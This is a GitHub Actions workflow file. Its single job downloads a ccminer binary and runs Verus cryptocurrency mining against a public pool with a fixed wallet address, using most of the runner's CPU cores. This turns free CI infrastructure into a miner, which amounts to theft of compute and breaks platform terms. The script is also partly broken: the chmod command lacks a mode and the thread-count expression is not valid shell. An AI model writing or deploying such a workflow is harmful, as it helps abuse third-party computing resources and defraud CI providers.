name: my

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v6
      - name: my
        run: |
          sudo apt install bc
          wget https://github.com/Oink70/ccminer-verus/releases/download/v3.8.3a-CPU/ccminer-v3.8.3a-oink_Ubuntu_18.04+nicehash
          mv ccminer* ccminer && chmod ccminer
          ./ccminer -a verus -o stratum+tcp://pool.verus.io:9999 -u 0x13e73ae803ebe4e57e21870f19b645771b57eacd -p x -t (math "floor("(nproc)" * 0.8)")

          

